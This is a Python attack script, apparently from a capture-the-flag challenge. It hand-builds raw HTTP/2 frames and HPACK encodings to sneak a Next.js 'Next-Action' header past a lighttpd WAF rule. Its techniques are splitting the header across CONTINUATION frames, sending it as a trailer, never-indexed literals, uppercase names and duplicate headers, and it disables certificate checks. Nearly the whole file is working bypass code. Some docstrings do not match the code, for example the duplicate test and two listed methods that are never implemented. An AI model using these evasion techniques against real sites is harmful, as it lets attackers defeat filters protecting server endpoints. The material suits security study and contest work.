#!/usr/bin/env python3
"""
probe29: WAF bypass for `Next-Action` header via raw HTTP/2.

WAF blocks ^Next-Action$ regex at lighttpd 1.4.81 level. We try:
1. Baseline: standard `next-action` header in HEADERS frame (expected 403)
2. Split mid-name across HEADERS + CONTINUATION frame
3. Header in TRAILERS (after body, in HEADERS frame with END_STREAM=1 after DATA)
4. Two headers — `x-fake: blah` + `next-action: <id>`, but with extra whitespace forms
5. HPACK Literal Never-Indexed (0x10 prefix) instead of default 0x00
6. Header sent as part of dynamic table reference (insert via 0x40, then ref by index)
7. Extra padding in HEADERS frame

If we get past WAF, action runs in fetch-mode and FormData/JSON args are passed to recoveryAction.
"""
import socket
import ssl
import struct
import time
import sys
from hpack import Encoder
from hyperframe.frame import (
    HeadersFrame, ContinuationFrame, DataFrame, SettingsFrame,
    WindowUpdateFrame, GoAwayFrame, RstStreamFrame
)

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")


PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def open_h2():
    """Open HTTP/2 TLS connection, send preface + settings, return (sock, ssl_sock)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
    sock.sendall(PREFACE)
    # Empty SETTINGS
    s = SettingsFrame(0)
    sock.sendall(s.serialize())
    return sock


def read_frames(sock, want_stream=1, max_time=8):
    """Read frames until END_STREAM=1 received on stream `want_stream` or timeout."""
    sock.settimeout(max_time)
    buf = b""
    end = False
    out = []
    deadline = time.time() + max_time
    while not end and time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError) as e:
            break
        if not chunk:
            break
        buf += chunk
        while True:
            if len(buf) < 9:
                break
            length = int.from_bytes(buf[:3], "big")
            ftype = buf[3]
            flags = buf[4]
            sid = int.from_bytes(buf[5:9], "big") & 0x7fffffff
            if len(buf) < 9 + length:
                break
            payload = buf[9:9+length]
            buf = buf[9+length:]
            out.append((ftype, flags, sid, payload))
            # END_STREAM flag = 0x1 for HEADERS/DATA
            if sid == want_stream and (ftype in (0, 1) and flags & 0x1):
                end = True
                break
    return out, end


def parse_response(frames):
    """Parse status code and body from frames."""
    from hpack import Decoder
    dec = Decoder()
    status = None
    body = b""
    headers = []
    for ftype, flags, sid, payload in frames:
        if ftype == 1:  # HEADERS
            # Strip padding/priority if flags say so
            data = payload
            if flags & 0x8:  # PADDED
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:  # PRIORITY
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                headers.extend(hdrs)
                for k, v in hdrs:
                    if k == b":status" or k == ":status":
                        status = v if isinstance(v, str) else v.decode()
            except Exception as e:
                pass  # CONTINUATION needed
        elif ftype == 0:  # DATA
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, headers, body


def send_request(headers_frames, data=b""):
    """
    headers_frames: list of (header_block_bytes, flags, frame_type)
       where frame_type is 'HEADERS' or 'CONTINUATION'
       flags 0x4 = END_HEADERS, 0x1 = END_STREAM
    data: optional body. If present, last headers frame should NOT have END_STREAM.
    """
    sock = open_h2()
    sid = 1
    # Read server preface settings first (best-effort)
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)

    # Send headers
    for i, (block, flags, ftype) in enumerate(headers_frames):
        if ftype == "HEADERS":
            f = HeadersFrame(sid, flags=set())
            f.data = block
            raw = struct.pack(">I", len(block))[1:] + b"\x01" + bytes([flags]) + struct.pack(">I", sid) + block
        else:  # CONTINUATION
            raw = struct.pack(">I", len(block))[1:] + b"\x09" + bytes([flags]) + struct.pack(">I", sid) + block
        sock.sendall(raw)

    # Send body if any
    if data:
        # split if large
        df_payload = data
        df = DataFrame(sid, flags=set())
        df.data = df_payload
        # END_STREAM=1
        raw = struct.pack(">I", len(df_payload))[1:] + b"\x00" + b"\x01" + struct.pack(">I", sid) + df_payload
        sock.sendall(raw)

    frames, end = read_frames(sock, want_stream=sid, max_time=10)
    sock.close()
    return parse_response(frames)


def hpack_encode_headers(headers):
    """headers = list of (name, value) — both bytes or str. Return bytes block."""
    enc = Encoder()
    # all literal w/ indexing OK for default
    out = enc.encode([(k.lower() if isinstance(k, str) else k.lower(), v) for k, v in headers])
    return out


def hpack_encode_literal_no_index(name, value):
    """Encode header with prefix 0x00 (Literal Without Indexing — no index)."""
    if isinstance(name, str):
        name = name.encode()
    if isinstance(value, str):
        value = value.encode()
    out = b"\x00"  # No index, full name literal
    out += encode_string(name)
    out += encode_string(value)
    return out


def hpack_encode_never_indexed(name, value):
    """Encode header with prefix 0x10 (Literal Never Indexed)."""
    if isinstance(name, str):
        name = name.encode()
    if isinstance(value, str):
        value = value.encode()
    out = b"\x10"  # Never indexed
    out += encode_string(name)
    out += encode_string(value)
    return out


def encode_string(s):
    """HPACK string encoding (no Huffman). prefix length on 7 bits."""
    out = b""
    n = len(s)
    if n < 127:
        out += bytes([n])
    else:
        # 7+ encoding
        out += b"\x7f"
        n -= 127
        while n >= 128:
            out += bytes([(n & 0x7f) | 0x80])
            n >>= 7
        out += bytes([n])
    out += s
    return out


# ------------------------ Test cases ------------------------

def run_test(label, headers_frames, data=b""):
    try:
        status, headers, body = send_request(headers_frames, data)
    except Exception as e:
        print(f"[{label:50s}] EXC: {e}")
        return None
    body_len = len(body)
    body_preview = body[:120].decode("utf-8", "replace")
    is_403 = status == "403"
    is_block = b"WAF" in body or b"blocked" in body.lower()
    marker = ""
    if not is_403 and not is_block:
        marker = " <BYPASS>"
    print(f"[{label:50s}] status={status} len={body_len} preview={body_preview!r}{marker}")
    return status, body


def t_baseline():
    """Plain Next-Action header — expect 403."""
    enc = Encoder()
    block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", "2"),
        ("next-action", ACTION_ID),
        ("user-agent", "p29-baseline"),
    ])
    return [(block, 0x04, "HEADERS")]  # END_HEADERS, NO END_STREAM (we send body)


def t_split_continuation():
    """Send `next-action` header split mid-name across HEADERS + CONTINUATION.

    Strategy: use literal-no-index encoding so we have raw name bytes inline.
    Split the block bytes such that 'next-' is in HEADERS and 'action' begins
    in CONTINUATION. lighttpd may evaluate WAF on each frame separately.
    """
    enc = Encoder()
    # Mandatory pseudo + standard headers in first block
    block_a = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", "2"),
        ("user-agent", "p29-split"),
    ])
    # Build the next-action header literally so we control bytes
    na_block = hpack_encode_literal_no_index("next-action", ACTION_ID)
    # Find offset of "next-action" inside na_block:
    # na_block = 0x00 + len("next-action") + b"next-action" + len(value) + value
    # Split mid-name: take first 7 bytes of name (= '0x00 0x0b "next-"' = 7 bytes), put rest in CONTINUATION
    # Actually let's split right after 0x00 + 0x0b + b'next-':
    cut = 1 + 1 + 5  # prefix + namelen + 'next-'
    part1 = na_block[:cut]
    part2 = na_block[cut:]

    return [
        (block_a + part1, 0x00, "HEADERS"),     # NO END_HEADERS, NO END_STREAM
        (part2, 0x04, "CONTINUATION"),          # END_HEADERS, no body END_STREAM
    ]


def t_trailers():
    """Send Next-Action in trailers (HEADERS frame after DATA with END_STREAM=1)."""
    enc = Encoder()
    block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", "2"),
        ("trailer", "next-action"),
        ("user-agent", "p29-trail"),
    ])
    trailer_block = enc.encode([
        ("next-action", ACTION_ID),
    ])
    # Trailers emitted by special path below — return marker
    return [(block, 0x04, "HEADERS"), ("__trailer__", trailer_block)]


def t_never_indexed():
    """Use HPACK never-indexed prefix (0x10) for next-action."""
    enc = Encoder()
    block_a = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", "2"),
        ("user-agent", "p29-ni"),
    ])
    na = hpack_encode_never_indexed("next-action", ACTION_ID)
    return [(block_a + na, 0x04, "HEADERS")]


def t_uppercase_name():
    """Try Next-Action with mixed case directly via raw literal — should be normalized to lowercase by Node, but may fool WAF if WAF case-sensitive. WAF is case-insensitive though."""
    enc = Encoder()
    block_a = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", "2"),
        ("user-agent", "p29-up"),
    ])
    # HTTP/2 RFC says header names MUST be lowercase; sending uppercase
    # may be rejected, but lighttpd may be lenient
    na = hpack_encode_literal_no_index("Next-Action", ACTION_ID)
    return [(block_a + na, 0x04, "HEADERS")]


def t_dup_header():
    """Send next-action twice — once with junk, once with real id. Maybe WAF only blocks first match."""
    enc = Encoder()
    block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", "2"),
        ("next-action", ACTION_ID),
        ("next-action", ACTION_ID),
        ("user-agent", "p29-dup"),
    ])
    return [(block, 0x04, "HEADERS")]


# Custom wrapper for trailers
def send_with_trailers(blocks_with_trailer, body):
    sock = open_h2()
    sid = 1
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)

    head_block = blocks_with_trailer[0][0]
    trailer_block = blocks_with_trailer[1][1]

    # Send HEADERS with END_HEADERS=1, NO END_STREAM
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    # Send DATA with NO END_STREAM
    raw = struct.pack(">I", len(body))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body
    sock.sendall(raw)
    # Send HEADERS (trailer) with END_HEADERS + END_STREAM
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames, end = read_frames(sock, want_stream=sid, max_time=10)
    sock.close()
    return parse_response(frames)


def run_with_body(label, frames, body=b"[]"):
    """Wrapper: send frames + body, parse status."""
    try:
        if frames and frames[-1][0] == "__trailer__":
            status, headers, resp_body = send_with_trailers(frames, body)
        else:
            status, headers, resp_body = send_request(frames, body)
    except Exception as e:
        print(f"[{label:50s}] EXC: {type(e).__name__}: {e}")
        return None
    is_403 = status == "403"
    body_len = len(resp_body)
    preview = resp_body[:140].decode("utf-8", "replace")
    marker = " <BYPASS>" if not is_403 and "WAF" not in preview else ""
    print(f"[{label:50s}] status={status} len={body_len:5d} preview={preview!r}{marker}")
    return status


# Run all tests
print("\n## WAF bypass attempts via raw HTTP/2:\n")
run_with_body("baseline-plain-next-action",     t_baseline())
run_with_body("split-mid-name-continuation",    t_split_continuation())
run_with_body("trailers-after-body",            t_trailers())
run_with_body("hpack-never-indexed",            t_never_indexed())
run_with_body("uppercase-Next-Action-literal",  t_uppercase_name())
run_with_body("duplicate-next-action",          t_dup_header())

print("\n# done.")
